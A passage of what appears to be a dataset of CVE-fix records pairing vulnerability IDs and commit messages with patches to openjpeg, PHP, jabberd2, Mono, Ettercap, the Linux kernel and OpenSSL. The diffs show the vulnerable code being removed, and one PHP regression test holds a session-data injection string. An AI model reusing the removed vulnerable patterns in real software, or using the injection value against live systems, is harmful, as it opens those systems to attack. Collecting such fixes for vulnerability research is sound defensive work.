comp->dy) {\n+                        continue;\n+                    }\n+\n+                    /* See ISO-15441. B.12.1.4 Position-component-resolution level-layer progression */\n                     if (!((pi->y % (OPJ_INT32)(comp->dy << rpy) == 0) || ((pi->y == pi->ty0) &&\n                             ((try0 << levelno) % (1 << rpy))))) {\n                         continue;\n@@ -557,6 +579,17 @@ static OPJ_BOOL opj_pi_next_cprl(opj_pi_iterator_t * pi)\n                     try1 = opj_int_ceildiv(pi->ty1, (OPJ_INT32)(comp->dy << levelno));\n                     rpx = res->pdx + levelno;\n                     rpy = res->pdy + levelno;\n+\n+                    /* To avoid divisions by zero / undefined behaviour on shift */\n+                    /* in below tests */\n+                    /* Fixes reading id:000019,sig:08,src:001098,op:flip1,pos:49 */\n+                    /* of https://github.com/uclouvain/openjpeg/issues/938 */\n+                    if (rpx >= 31 || ((comp->dx << rpx) >> rpx) != comp->dx ||\n+                            rpy >= 31 || ((comp->dy << rpy) >> rpy) != comp->dy) {\n+                        continue;\n+                    }\n+\n+                    /* See ISO-15441. B.12.1.5 Component-position-resolution level-layer progression */\n                     if (!((pi->y % (OPJ_INT32)(comp->dy << rpy) == 0) || ((pi->y == pi->ty0) &&\n                             ((try0 << levelno) % (1 << rpy))))) {\n                         continue;\n", "owner": "uclouvain", "repo": "openjpeg", "source": "cve"}
{"CVE_ID": "CVE-2016-7125", "CWE_ID": "74", "category": "security", "commit_id": "8763c6090d627d8bb0ee1d030c30e58f406be9ce", "commit_message": "From 8763c6090d627d8bb0ee1d030c30e58f406be9ce Mon Sep 17 00:00:00 2001\nFrom: Stanislav Malyshev <stas@php.net>\nDate: Wed, 3 Aug 2016 00:30:12 -0700\nSubject: [PATCH] Fix bug #72681 - consume data even if we're not storing them\n\n---\n ext/session/session.c           | 25 ++++++++++++++++++-------\n ext/session/tests/bug72681.phpt | 16 ++++++++++++++++\n 2 files changed, 34 insertions(+), 7 deletions(-)\n create mode 100644 ext/session/tests/bug72681.phpt\n\n", "diff_code": "diff --git a/ext/session/session.c b/ext/session/session.c\nindex c668bb7b2a27..b2d02361dfd1 100644\n--- a/ext/session/session.c\n+++ b/ext/session/session.c\n@@ -924,11 +924,13 @@ PS_SERIALIZER_DECODE_FUNC(php_binary) /* {{{ */\n \tint namelen;\n \tint has_value;\n \tphp_unserialize_data_t var_hash;\n+\tint skip = 0;\n \n \tPHP_VAR_UNSERIALIZE_INIT(var_hash);\n \n \tfor (p = val; p < endptr; ) {\n \t\tzval **tmp;\n+\t\tskip = 0;\n \t\tnamelen = ((unsigned char)(*p)) & (~PS_BIN_UNDEF);\n \n \t\tif (namelen < 0 || namelen > PS_BIN_MAX || (p + namelen) >= endptr) {\n@@ -944,22 +946,25 @@ PS_SERIALIZER_DECODE_FUNC(php_binary) /* {{{ */\n \n \t\tif (zend_hash_find(&EG(symbol_table), name, namelen + 1, (void **) &tmp) == SUCCESS) {\n \t\t\tif ((Z_TYPE_PP(tmp) == IS_ARRAY && Z_ARRVAL_PP(tmp) == &EG(symbol_table)) || *tmp == PS(http_session_vars)) {\n-\t\t\t\tefree(name);\n-\t\t\t\tcontinue;\n+\t\t\t\tskip = 1;\n \t\t\t}\n \t\t}\n \n \t\tif (has_value) {\n \t\t\tALLOC_INIT_ZVAL(current);\n \t\t\tif (php_var_unserialize(&current, (const unsigned char **) &p, (const unsigned char *) endptr, &var_hash TSRMLS_CC)) {\n-\t\t\t\tphp_set_session_var(name, namelen, current, &var_hash  TSRMLS_CC);\n+\t\t\t\tif (!skip) {\n+\t\t\t\t\tphp_set_session_var(name, namelen, current, &var_hash  TSRMLS_CC);\n+\t\t\t\t}\n \t\t\t} else {\n \t\t\t\tPHP_VAR_UNSERIALIZE_DESTROY(var_hash);\n \t\t\t\treturn FAILURE;\n \t\t\t}\n \t\t\tvar_push_dtor_no_addref(&var_hash, &current);\n \t\t}\n-\t\tPS_ADD_VARL(name, namelen);\n+\t\tif (!skip) {\n+\t\t\tPS_ADD_VARL(name, namelen);\n+\t\t}\n \t\tefree(name);\n \t}\n \n@@ -1016,6 +1021,7 @@ PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */\n \tint namelen;\n \tint has_value;\n \tphp_unserialize_data_t var_hash;\n+\tint skip = 0;\n \n \tPHP_VAR_UNSERIALIZE_INIT(var_hash);\n \n@@ -1024,6 +1030,7 @@ PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */\n \twhile (p < endptr) {\n \t\tzval **tmp;\n \t\tq = p;\n+\t\tskip = 0;\n \t\twhile (*q != PS_DELIMITER) {\n \t\t\tif (++q >= endptr) goto break_outer_loop;\n \t\t}\n@@ -1040,14 +1047,16 @@ PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */\n \n \t\tif (zend_hash_find(&EG(symbol_table), name, namelen + 1, (void **) &tmp) == SUCCESS) {\n \t\t\tif ((Z_TYPE_PP(tmp) == IS_ARRAY && Z_ARRVAL_PP(tmp) == &EG(symbol_table)) || *tmp == PS(http_session_vars)) {\n-\t\t\t\tgoto skip;\n+\t\t\t\tskip = 1;\n \t\t\t}\n \t\t}\n \n \t\tif (has_value) {\n \t\t\tALLOC_INIT_ZVAL(current);\n \t\t\tif (php_var_unserialize(&current, (const unsigned char **) &q, (const unsigned char *) endptr, &var_hash TSRMLS_CC)) {\n-\t\t\t\tphp_set_session_var(name, namelen, current, &var_hash  TSRMLS_CC);\n+\t\t\t\tif (!skip) {\n+\t\t\t\t\tphp_set_session_var(name, namelen, current, &var_hash  TSRMLS_CC);\n+\t\t\t\t}\n \t\t\t} else {\n \t\t\t\tvar_push_dtor_no_addref(&var_hash, &current);\n \t\t\t\tefree(name);\n@@ -1056,7 +1065,9 @@ PS_SERIALIZER_DECODE_FUNC(php) /* {{{ */\n \t\t\t}\n \t\t\tvar_push_dtor_no_addref(&var_hash, &current);\n \t\t}\n-\t\tPS_ADD_VARL(name, namelen);\n+\t\tif (!skip) {\n+\t\t\tPS_ADD_VARL(name, namelen);\n+\t\t}\n skip:\n \t\tefree(name);\n \ndiff --git a/ext/session/tests/bug72681.phpt b/ext/session/tests/bug72681.phpt\nnew file mode 100644\nindex 000000000000..ca38b07fc909\n--- /dev/null\n+++ b/ext/session/tests/bug72681.phpt\n@@ -0,0 +1,16 @@\n+--TEST--\n+Bug #72681: PHP Session Data Injection Vulnerability\n+--SKIPIF--\n+<?php include('skipif.inc'); ?>\n+--FILE--\n+<?php\n+ini_set('session.serialize_handler', 'php');\n+session_start();\n+$_SESSION['_SESSION'] = 'ryat|O:8:\"stdClass\":0:{}';\n+session_write_close();\n+session_start();\n+var_dump($_SESSION);\n+?>\n+--EXPECT--\n+array(0) {\n+}\n", "owner": "php", "repo": "php-src", "source": "cve"}
{"CVE_ID": "CVE-2012-3525", "CWE_ID": "20", "category": "security", "commit_id": "aabcffae560d5fd00cd1d2ffce5d760353cf0a4d", "commit_message": "From aabcffae560d5fd00cd1d2ffce5d760353cf0a4d Mon Sep 17 00:00:00 2001\nFrom: Tomasz Sterna <tomek@xiaoka.com>\nDate: Mon, 6 Aug 2012 20:41:23 +0200\nSubject: [PATCH] Fixed possibility of Unsolicited Dialback Attacks\n\n---\n s2s/out.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/s2s/out.c b/s2s/out.c\nindex 0ed9b301..7b9f44ff 100644\n--- a/s2s/out.c\n+++ b/s2s/out.c\n@@ -1661,7 +1661,7 @@ static void _out_result(conn_t out, nad_t nad) {\n     rkeylen = strlen(rkey);\n \n     /* key is valid */\n-    if(nad_find_attr(nad, 0, -1, \"type\", \"valid\") >= 0) {\n+    if(nad_find_attr(nad, 0, -1, \"type\", \"valid\") >= 0 && xhash_get(out->states, rkey) == (void*) conn_INPROGRESS) {\n         log_write(out->s2s->log, LOG_NOTICE, \"[%d] [%s, port=%d] outgoing route '%s' is now valid%s%s\", out->fd->fd, out->ip, out->port, rkey, (out->s->flags & SX_SSL_WRAPPER) ? \", TLS negotiated\" : \"\", out->s->compressed ? \", ZLIB compression enabled\" : \"\");\n \n         xhash_put(out->states, pstrdup(xhash_pool(out->states), rkey), (void *) conn_VALID);    /* !!! small leak here */\n@@ -1749,7 +1749,7 @@ static void _out_verify(conn_t out, nad_t nad) {\n     rkey = s2s_route_key(NULL, to->domain, from->domain);\n \n     attr = nad_find_attr(nad, 0, -1, \"type\", \"valid\");\n-    if(attr >= 0) {\n+    if(attr >= 0 && xhash_get(in->states, rkey) == (void*) conn_INPROGRESS) {\n         xhash_put(in->states, pstrdup(xhash_pool(in->states), rkey), (void *) conn_VALID);\n         log_write(in->s2s->log, LOG_NOTICE, \"[%d] [%s, port=%d] incoming route '%s' is now valid%s%s\", in->fd->fd, in->ip, in->port, rkey, (in->s->flags & SX_SSL_WRAPPER) ? \", TLS negotiated\" : \"\", in->s->compressed ? \", ZLIB compression enabled\" : \"\");\n         valid = 1;\n", "owner": "Jabberd2", "repo": "jabberd2", "source": "cve"}
{"CVE_ID": "CVE-2010-4254", "CWE_ID": "20", "category": "security", "commit_id": "4905ef1130feb26c3150b28b97e4a96752e0d399", "commit_message": "From 4905ef1130feb26c3150b28b97e4a96752e0d399 Mon Sep 17 00:00:00 2001\nFrom: Rodrigo Kumpera <kumpera@gmail.com>\nDate: Thu, 25 Nov 2010 14:23:31 -0200\nSubject: [PATCH] Handle invalid instantiation of generic methods.\n\n\t* verify.c: Add new function to internal verifier API to check\n\tmethod instantiations.\n\n\t* reflection.c (mono_reflection_bind_generic_method_parameters):\n\tCheck the instantiation before returning it.\n\n\tFixes #655847\n---\n mono/metadata/reflection.c       |  3 +++\n mono/metadata/verify-internals.h |  1 +\n mono/metadata/verify.c           | 15 +++++++++++++++\n 3 files changed, 19 insertions(+)\n\n", "diff_code": "diff --git a/mono/metadata/reflection.c b/mono/metadata/reflection.c\nindex 3ba44ea8399a..f7905f651528 100644\n--- a/mono/metadata/reflection.c\n+++ b/mono/metadata/reflection.c\n@@ -10176,6 +10176,9 @@ mono_reflection_bind_generic_method_parameters (MonoReflectionMethod *rmethod, M\n \t\tmono_g_hash_table_insert (image->generic_def_objects, imethod, rmethod);\n \t\tmono_loader_unlock ();\n \t}\n+\n+\tif (!mono_verifier_is_method_valid_generic_instantiation (inflated))\n+\t\tmono_raise_exception (mono_get_exception_argument (\"typeArguments\", \"Invalid generic arguments\"));\n \t\n \treturn mono_method_get_object (mono_object_domain (rmethod), inflated, NULL);\n }\ndiff --git a/mono/metadata/verify-internals.h b/mono/metadata/verify-internals.h\nindex f73b01044d56..a95cc5d2d799 100644\n--- a/mono/metadata/verify-internals.h\n+++ b/mono/metadata/verify-internals.h\n@@ -22,6 +22,7 @@ gboolean mono_verifier_is_enabled_for_class (MonoClass *klass) MONO_INTERNAL;\n gboolean mono_verifier_is_method_full_trust (MonoMethod *method) MONO_INTERNAL;\n gboolean mono_verifier_is_class_full_trust (MonoClass *klass) MONO_INTERNAL;\n gboolean mono_verifier_class_is_valid_generic_instantiation (MonoClass *class) MONO_INTERNAL;\n+gboolean mono_verifier_is_method_valid_generic_instantiation (MonoMethod *method) MONO_INTERNAL;\n \n gboolean mono_verifier_verify_class (MonoClass *klass) MONO_INTERNAL;\n \ndiff --git a/mono/metadata/verify.c b/mono/metadata/verify.c\nindex b678ed71722e..2b393a99a93e 100644\n--- a/mono/metadata/verify.c\n+++ b/mono/metadata/verify.c\n@@ -6533,6 +6533,14 @@ mono_verifier_class_is_valid_generic_instantiation (MonoClass *class)\n \treturn mono_class_is_valid_generic_instantiation (NULL, class);\n }\n \n+gboolean\n+mono_verifier_is_method_valid_generic_instantiation (MonoMethod *method)\n+{\n+\tif (!method->is_inflated)\n+\t\treturn TRUE;\n+\treturn mono_method_is_valid_generic_instantiation (NULL, method);\n+}\n+\n #else\n \n gboolean\n@@ -6611,5 +6619,12 @@ mono_verifier_class_is_valid_generic_instantiation (MonoClass *class)\n \treturn TRUE;\n }\n \n+gboolean\n+mono_verifier_is_method_valid_generic_instantiation (MonoMethod *method)\n+{\n+\treturn TRUE;\n+}\n+\n+\n \n #endif\n", "owner": "mono", "repo": "mono", "source": "cve"}
{"CVE_ID": "CVE-2014-6396", "CWE_ID": "119", "category": "security", "commit_id": "e3abe7d7585ecc420a7cab73313216613aadad5a", "commit_message": "From e3abe7d7585ecc420a7cab73313216613aadad5a Mon Sep 17 00:00:00 2001\nFrom: NickSampanis <nicksampanis@gmail.com>\nDate: Wed, 3 Sep 2014 13:59:51 +0300\nSubject: [PATCH] Fixed heap overflow caused by length\n\n---\n src/dissectors/ec_postgresql.c | 10 +++++++---\n 1 file changed, 7 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/src/dissectors/ec_postgresql.c b/src/dissectors/ec_postgresql.c\nindex fa2674164..95bf55270 100644\n--- a/src/dissectors/ec_postgresql.c\n+++ b/src/dissectors/ec_postgresql.c\n@@ -39,7 +39,7 @@ struct postgresql_status {\n    u_char status;\n    u_char user[65];\n    u_char type;\n-   u_char password[65];\n+   u_char password[66];\n    u_char hash[33];\n    u_char salt[9];\n    u_char database[65];\n@@ -157,8 +157,12 @@ FUNC_DECODER(dissector_postgresql)\n                int length;\n                DEBUG_MSG(\"\\tDissector_postgresql RESPONSE type is clear-text!\");\n                GET_ULONG_BE(length, ptr, 1);\n-               strncpy((char*)conn_status->password, (char*)(ptr + 5), length - 4);\n-               conn_status->password[length - 4] = 0;\n+               length -= 4;\n+               if (length < 0 || length > 65 || PACKET->DATA.len < length+5) {\n+                   dissect_wipe_session(PACKET, DISSECT_CODE(dissector_postgresql));\n+                   return NULL;\n+               }\n+               snprintf((char*)conn_status->password, length+1, \"%s\", (char*)(ptr + 5));\n                DISSECT_MSG(\"PostgreSQL credentials:%s-%d:%s:%s\\n\", ip_addr_ntoa(&PACKET->L3.dst, tmp), ntohs(PACKET->L4.dst), conn_status->user, conn_status->password);\n                dissect_wipe_session(PACKET, DISSECT_CODE(dissector_postgresql));\n             }\n", "owner": "Ettercap", "repo": "ettercap", "source": "cve"}
{"CVE_ID": "CVE-2017-16530", "CWE_ID": "125", "category": "security", "commit_id": "786de92b3cb26012d3d0f00ee37adf14527f35c4", "commit_message": "From 786de92b3cb26012d3d0f00ee37adf14527f35c4 Mon Sep 17 00:00:00 2001\nFrom: Alan Stern <stern@rowland.harvard.edu>\nDate: Fri, 22 Sep 2017 11:56:49 -0400\nSubject: [PATCH] USB: uas: fix bug in handling of alternate settings\n\nThe uas driver has a subtle bug in the way it handles alternate\nsettings.  The uas_find_uas_alt_setting() routine returns an\naltsetting value (the bAlternateSetting number in the descriptor), but\nuas_use_uas_driver() then treats that value as an index to the\nintf->altsetting array, which it isn't.\n\nNormally this doesn't cause any problems because the various\nalternate settings have bAlternateSetting values 0, 1, 2, ..., so the\nvalue is equal to the index in the array.  But this is not guaranteed,\nand Andrey Konovalov used the syzkaller fuzzer with KASAN to get a\nslab-out-of-bounds error by violating this assumption.\n\nThis patch fixes the bug by making uas_find_uas_alt_setting() return a\npointer to the altsetting entry rather than either the value or the\nindex.  Pointers are less subject to misinterpretation.\n\nSigned-off-by: Alan Stern <stern@rowland.harvard.edu>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nCC: Oliver Neukum <oneukum@suse.com>\nCC: <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\n---\n drivers/usb/storage/uas-detect.h | 15 ++++++++-------\n drivers/usb/storage/uas.c        | 10 +++++-----\n 2 files changed, 13 insertions(+), 12 deletions(-)\n\n", "diff_code": "diff --git a/drivers/usb/storage/uas-detect.h b/drivers/usb/storage/uas-detect.h\nindex f58caa9e6a27e..a155cd02bce24 100644\n--- a/drivers/usb/storage/uas-detect.h\n+++ b/drivers/usb/storage/uas-detect.h\n@@ -9,7 +9,8 @@ static int uas_is_interface(struct usb_host_interface *intf)\n \t\tintf->desc.bInterfaceProtocol == USB_PR_UAS);\n }\n \n-static int uas_find_uas_alt_setting(struct usb_interface *intf)\n+static struct usb_host_interface *uas_find_uas_alt_setting(\n+\t\tstruct usb_interface *intf)\n {\n \tint i;\n \n@@ -17,10 +18,10 @@ static int uas_find_uas_alt_setting(struct usb_interface *intf)\n \t\tstruct usb_host_interface *alt = &intf->altsetting[i];\n \n \t\tif (uas_is_interface(alt))\n-\t\t\treturn alt->desc.bAlternateSetting;\n+\t\t\treturn alt;\n \t}\n \n-\treturn -ENODEV;\n+\treturn NULL;\n }\n \n static int uas_find_endpoints(struct usb_host_interface *alt,\n@@ -58,14 +59,14 @@ static int uas_use_uas_driver(struct usb_interface *intf,\n \tstruct usb_device *udev = interface_to_usbdev(intf);\n \tstruct usb_hcd *hcd = bus_to_hcd(udev->bus);\n \tunsigned long flags = id->driver_info;\n-\tint r, alt;\n-\n+\tstruct usb_host_interface *alt;\n+\tint r;\n \n \talt = uas_find_uas_alt_setting(intf);\n-\tif (alt < 0)\n+\tif (!alt)\n \t\treturn 0;\n \n-\tr = uas_find_endpoints(&intf->altsetting[alt], eps);\n+\tr = uas_find_endpoints(alt, eps);\n \tif (r < 0)\n \t\treturn 0;\n \ndiff --git a/drivers/usb/storage/uas.c b/drivers/usb/storage/uas.c\nindex cfb1e3bbd4347..63cf981ed81cf 100644\n--- a/drivers/usb/storage/uas.c\n+++ b/drivers/usb/storage/uas.c\n@@ -873,14 +873,14 @@ MODULE_DEVICE_TABLE(usb, uas_usb_ids);\n static int uas_switch_interface(struct usb_device *udev,\n \t\t\t\tstruct usb_interface *intf)\n {\n-\tint alt;\n+\tstruct usb_host_interface *alt;\n \n \talt = uas_find_uas_alt_setting(intf);\n-\tif (alt < 0)\n-\t\treturn alt;\n+\tif (!alt)\n+\t\treturn -ENODEV;\n \n-\treturn usb_set_interface(udev,\n-\t\t\tintf->altsetting[0].desc.bInterfaceNumber, alt);\n+\treturn usb_set_interface(udev, alt->desc.bInterfaceNumber,\n+\t\t\talt->desc.bAlternateSetting);\n }\n \n static int uas_configure_endpoints(struct uas_dev_info *devinfo)\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2009-1243", "CWE_ID": "16", "category": "security", "commit_id": "30842f2989aacfaba3ccb39829b3417be9313dbe", "commit_message": "From 30842f2989aacfaba3ccb39829b3417be9313dbe Mon Sep 17 00:00:00 2001\nFrom: Vitaly Mayatskikh <v.mayatskih@gmail.com>\nDate: Mon, 23 Mar 2009 15:22:33 -0700\nSubject: udp: Wrong locking code in udp seq_file infrastructure\n\nReading zero bytes from /proc/net/udp or other similar files which use\nthe same seq_file udp infrastructure panics kernel in that way:\n\n=====================================\n[ BUG: bad unlock balance detected! ]\n-------------------------------------\nread/1985 is trying to release lock (&table->hash[i].lock) at:\n[<ffffffff81321d83>] udp_seq_stop+0x27/0x29\nbut there are no more locks to release!\n\nother info that might help us debug this:\n1 lock held by read/1985:\n #0:  (&p->lock){--..}, at: [<ffffffff810eefb6>] seq_read+0x38/0x348\n\nstack backtrace:\nPid: 1985, comm: read Not tainted 2.6.29-rc8 #9\nCall Trace:\n [<ffffffff81321d83>] ? udp_seq_stop+0x27/0x29\n [<ffffffff8106dab9>] print_unlock_inbalance_bug+0xd6/0xe1\n [<ffffffff8106db62>] lock_release_non_nested+0x9e/0x1c6\n [<ffffffff810ef030>] ? seq_read+0xb2/0x348\n [<ffffffff8106bdba>] ? mark_held_locks+0x68/0x86\n [<ffffffff81321d83>] ? udp_seq_stop+0x27/0x29\n [<ffffffff8106dde7>] lock_release+0x15d/0x189\n [<ffffffff8137163c>] _spin_unlock_bh+0x1e/0x34\n [<ffffffff81321d83>] udp_seq_stop+0x27/0x29\n [<ffffffff810ef239>] seq_read+0x2bb/0x348\n [<ffffffff810eef7e>] ? seq_read+0x0/0x348\n [<ffffffff8111aedd>] proc_reg_read+0x90/0xaf\n [<ffffffff810d878f>] vfs_read+0xa6/0x103\n [<ffffffff8106bfac>] ? trace_hardirqs_on_caller+0x12f/0x153\n [<ffffffff810d88a2>] sys_read+0x45/0x69\n [<ffffffff8101123a>] system_call_fastpath+0x16/0x1b\nBUG: scheduling while atomic: read/1985/0xffffff00\nINFO: lockdep is turned off.\nModules linked in: cpufreq_ondemand acpi_cpufreq freq_table dm_multipath kvm ppdev snd_hda_codec_analog snd_hda_intel snd_hda_codec snd_hwdep snd_seq_dummy snd_seq_oss snd_seq_midi_event arc4 snd_s\neq ecb thinkpad_acpi snd_seq_device iwl3945 hwmon sdhci_pci snd_pcm_oss sdhci rfkill mmc_core snd_mixer_oss i2c_i801 mac80211 yenta_socket ricoh_mmc i2c_core iTCO_wdt snd_pcm iTCO_vendor_support rs\nrc_nonstatic snd_timer snd lib80211 cfg80211 soundcore snd_page_alloc video parport_pc output parport e1000e [last unloaded: scsi_wait_scan]\nPid: 1985, comm: read Not tainted 2.6.29-rc8 #9\nCall Trace:\n [<ffffffff8106b456>] ? __debug_show_held_locks+0x1b/0x24\n [<ffffffff81043660>] __schedule_bug+0x7e/0x83\n [<ffffffff8136ede9>] schedule+0xce/0x838\n [<ffffffff810d7972>] ? fsnotify_access+0x5f/0x67\n [<ffffffff810112d0>] ? sysret_careful+0xb/0x37\n [<ffffffff8106be9c>] ? trace_hardirqs_on_caller+0x1f/0x153\n [<ffffffff8137127b>] ? trace_hardirqs_on_thunk+0x3a/0x3f\n [<ffffffff810112f6>] sysret_careful+0x31/0x37\nread[1985]: segfault at 7fffc479bfe8 ip 0000003e7420a180 sp 00007fffc479bfa0 error 6\nKernel panic - not syncing: Aiee, killing interrupt handler!\n\nudp_seq_stop() tries to unlock not yet locked spinlock. The lock was lost\nduring splitting global udp_hash_lock to subsequent spinlocks.\n\nSigned-off by: Vitaly Mayatskikh <v.mayatskih@gmail.com>\nAcked-by: Eric Dumazet <dada1@cosmosbay.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n net/ipv4/udp.c | 6 +++++-\n 1 file changed, 5 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/net/ipv4/udp.c b/net/ipv4/udp.c\nindex c47c989cb1fb..c8bee189a193 100644\n--- a/net/ipv4/udp.c\n+++ b/net/ipv4/udp.c\n@@ -1614,7 +1614,8 @@ static struct sock *udp_get_next(struct seq_file *seq, struct sock *sk)\n \t} while (sk && (!net_eq(sock_net(sk), net) || sk->sk_family != state->family));\n \n \tif (!sk) {\n-\t\tspin_unlock_bh(&state->udp_table->hash[state->bucket].lock);\n+\t\tif (state->bucket < UDP_HTABLE_SIZE)\n+\t\t\tspin_unlock_bh(&state->udp_table->hash[state->bucket].lock);\n \t\treturn udp_get_first(seq, state->bucket + 1);\n \t}\n \treturn sk;\n@@ -1632,6 +1633,9 @@ static struct sock *udp_get_idx(struct seq_file *seq, loff_t pos)\n \n static void *udp_seq_start(struct seq_file *seq, loff_t *pos)\n {\n+\tstruct udp_iter_state *state = seq->private;\n+\tstate->bucket = UDP_HTABLE_SIZE;\n+\n \treturn *pos ? udp_get_idx(seq, *pos-1) : SEQ_START_TOKEN;\n }\n \n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "stoth68000", "repo": "media-tree", "source": "cve"}
{"CVE_ID": "CVE-2010-2963", "CWE_ID": "20", "category": "security", "commit_id": "3e645d6b485446c54c6745c5e2cf5c528fe4deec", "commit_message": "From 3e645d6b485446c54c6745c5e2cf5c528fe4deec Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Fri, 15 Oct 2010 11:12:38 -0700\nSubject: v4l1: fix 32-bit compat microcode loading translation\n\nThe compat code for the VIDIOCSMICROCODE ioctl is totally buggered.\nIt's only used by the VIDEO_STRADIS driver, and that one is scheduled to\nstaging and eventually removed unless somebody steps up to maintain it\n(at which point it should use request_firmware() rather than some magic\nioctl).  So we'll get rid of it eventually.\n\nBut in the meantime, the compatibility ioctl code is broken, and this\ntries to get it to at least limp along (even if Mauro suggested just\ndeleting it entirely, which may be the right thing to do - I don't think\nthe compatibility translation code has ever worked unless you were very\nlucky).\n\nReported-by: Kees Cook <kees.cook@canonical.com>\nCc: Mauro Carvalho Chehab <mchehab@infradead.org>\nCc: stable@kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n drivers/media/video/v4l2-compat-ioctl32.c | 32 ++++++++++++++++++++-----------\n 1 file changed, 21 insertions(+), 11 deletions(-)\n\n", "diff_code": "diff --git a/drivers/media/video/v4l2-compat-ioctl32.c b/drivers/media/video/v4l2-compat-ioctl32.c\nindex 073f01390cdd..86294ed35c9b 100644\n--- a/drivers/media/video/v4l2-compat-ioctl32.c\n+++ b/drivers/media/video/v4l2-compat-ioctl32.c\n@@ -193,17 +193,24 @@ static int put_video_window32(struct video_window *kp, struct video_window32 __u\n struct video_code32 {\n \tchar\t\tloadwhat[16];\t/* name or tag of file being passed */\n \tcompat_int_t\tdatasize;\n-\tunsigned char\t*data;\n+\tcompat_uptr_t\tdata;\n };\n \n-static int get_microcode32(struct video_code *kp, struct video_code32 __user *up)\n+static struct video_code __user *get_microcode32(struct video_code32 *kp)\n {\n-\tif (!access_ok(VERIFY_READ, up, sizeof(struct video_code32)) ||\n-\t\tcopy_from_user(kp->loadwhat, up->loadwhat, sizeof(up->loadwhat)) ||\n-\t\tget_user(kp->datasize, &up->datasize) ||\n-\t\tcopy_from_user(kp->data, up->data, up->datasize))\n-\t\t\treturn -EFAULT;\n-\treturn 0;\n+\tstruct video_code __user *up;\n+\n+\tup = compat_alloc_user_space(sizeof(*up));\n+\n+\t/*\n+\t * NOTE! We don't actually care if these fail. If the\n+\t * user address is invalid, the native ioctl will do\n+\t * the error handling for us\n+\t */\n+\t(void) copy_to_user(up->loadwhat, kp->loadwhat, sizeof(up->loadwhat));\n+\t(void) put_user(kp->datasize, &up->datasize);\n+\t(void) put_user(compat_ptr(kp->data), &up->data);\n+\treturn up;\n }\n \n #define VIDIOCGTUNER32\t\t_IOWR('v', 4, struct video_tuner32)\n@@ -739,7 +746,7 @@ static long do_video_ioctl(struct file *file, unsigned int cmd, unsigned long ar\n \t\tstruct video_tuner vt;\n \t\tstruct video_buffer vb;\n \t\tstruct video_window vw;\n-\t\tstruct video_code vc;\n+\t\tstruct video_code32 vc;\n \t\tstruct video_audio va;\n #endif\n \t\tstruct v4l2_format v2f;\n@@ -818,8 +825,11 @@ static long do_video_ioctl(struct file *file, unsigned int cmd, unsigned long ar\n \t\tbreak;\n \n \tcase VIDIOCSMICROCODE:\n-\t\terr = get_microcode32(&karg.vc, up);\n-\t\tcompatible_arg = 0;\n+\t\t/* Copy the 32-bit \"video_code32\" to kernel space */\n+\t\tif (copy_from_user(&karg.vc, up, sizeof(karg.vc)))\n+\t\t\treturn -EFAULT;\n+\t\t/* Convert the 32-bit version to a 64-bit version in user space */\n+\t\tup = get_microcode32(&karg.vc);\n \t\tbreak;\n \n \tcase VIDIOCSFREQ:\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "mjg59", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2015-0206", "CWE_ID": "119", "category": "security", "commit_id": "103b171d8fc282ef435f8de9afbf7782e312961f", "commit_message": "From 103b171d8fc282ef435f8de9afbf7782e312961f Mon Sep 17 00:00:00 2001\nFrom: Matt Caswell <matt@openssl.org>\nDate: Wed, 7 Jan 2015 14:18:13 +0000\nSubject: [PATCH] A memory leak can occur in dtls1_buffer_record if either of\n the calls to ssl3_setup_buffers or pqueue_insert fail. The former will fail\n if there is a malloc failure, whilst the latter will fail if attempting to\n add a duplicate record to the queue. This should never happen because\n duplicate records should be detected and dropped before any attempt to add\n them to the queue. Unfortunately records that arrive that are for the next\n epoch are not being recorded correctly, and therefore replays are not being\n detected. Additionally, these \"should not happen\" failures that can occur in\n dtls1_buffer_record are not being treated as fatal and therefore an attacker\n could exploit this by sending repeated replay records for the next epoch,\n eventually causing a DoS through memory exhaustion.\n\nThanks to Chris Mueller for reporting this issue and providing initial\nanalysis and a patch. Further analysis and the final patch was performed by\nMatt Caswell from the OpenSSL development team.\n\nCVE-2015-0206\n\nReviewed-by: Dr Stephen Henson <steve@openssl.org>\n---\n ssl/d1_pkt.c | 30 +++++++++++++++++++++---------\n 1 file changed, 21 insertions(+), 9 deletions(-)\n\n", "diff_code": "diff --git a/ssl/d1_pkt.c b/ssl/d1_pkt.c\nindex 1028e41b562..a8a06b439ba 100644\n--- a/ssl/d1_pkt.c\n+++ b/ssl/d1_pkt.c\n@@ -212,7 +212,7 @@ dtls1_buffer_record(SSL *s, record_pqueue *queue, unsigned char *priority)\n \t/* Limit the size of the queue to prevent DOS attacks */\n \tif (pqueue_size(queue->q) >= 100)\n \t\treturn 0;\n-\t\t\n+\n \trdata = OPENSSL_malloc(sizeof(DTLS1_RECORD_DATA));\n \titem = pitem_new(priority, rdata);\n \tif (rdata == NULL || item == NULL)\n@@ -247,18 +247,22 @@ dtls1_buffer_record(SSL *s, record_pqueue *queue, unsigned char *priority)\n \tif (!ssl3_setup_buffers(s))\n \t\t{\n \t\tSSLerr(SSL_F_DTLS1_BUFFER_RECORD, ERR_R_INTERNAL_ERROR);\n+\t\tif (rdata->rbuf.buf != NULL)\n+\t\t\tOPENSSL_free(rdata->rbuf.buf);\n \t\tOPENSSL_free(rdata);\n \t\tpitem_free(item);\n-\t\treturn(0);\n+\t\treturn(-1);\n \t\t}\n \n \t/* insert should not fail, since duplicates are dropped */\n \tif (pqueue_insert(queue->q, item) == NULL)\n \t\t{\n \t\tSSLerr(SSL_F_DTLS1_BUFFER_RECORD, ERR_R_INTERNAL_ERROR);\n+\t\tif (rdata->rbuf.buf != 